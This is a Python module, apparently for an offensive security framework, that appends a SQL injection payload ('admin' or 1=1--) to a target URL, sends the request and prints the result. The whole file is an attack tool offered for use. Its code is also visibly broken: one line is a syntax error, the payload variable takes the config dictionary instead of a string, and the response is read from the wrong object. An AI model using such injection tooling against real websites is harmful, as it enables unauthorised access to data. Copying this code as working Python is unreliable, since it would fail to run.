"""
This website takes advantage of
websites that are vulnerable
to sql injection is generates
a payload URI to send.
"""

import requests
import os
import sys
from colorama import *



class Exploit:
	config = {
		"URI": {"default": "https://www.example.com", "necessity": True},
    	"SqlCode": {"default": "'admin' or 1=1--", "necessity": True}
    }
	def show_options(self):
		print(Fore.YELLOW+"Options\t\tNecessity\t\tDefault"+Style.RESET_ALL)
		print(Fore.YELLOW+"-------\t\t---------\t\t-------"+Style.RESET_ALL)
		for key in sorted(self.config.keys()):
			print(Fore.YELLOW+"%s\t\t%s\t\t\t%s" % (
				key, self.config[key]["necessity"], self.get_config(key))+Style.RESET_ALL)
	

	@staticmethod
	def show_info():
		print(Fore.YELLOW+"This website takes advantage of the\n sql injection you can put in the uri\n then print out the content\n")

	
	def set_config(self, key, value):
		if key in self.config.keys():
			self.config[key]["default"] = value
		else:
			print("No options")
	
	
	def get_config(self, key):
		return self.config[key]["default"]

	def run(self):
		URI=self.config[]
		Useragent=[]
		
		if os.name=='nt' or os.name=='posix':
			Useragent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
		else:
			sys.exit()
		
		payload=self.config["SqlCode"]
		
		uriPacket=URI+payload+"--"
		print(Fore.CYAN+"[+] "+Style.RESET_ALL+"Generated URI ")
		
		Session=requests.session()
		Session.get(uriPacket)
		
		print(Session.content)
		
		Session.close()
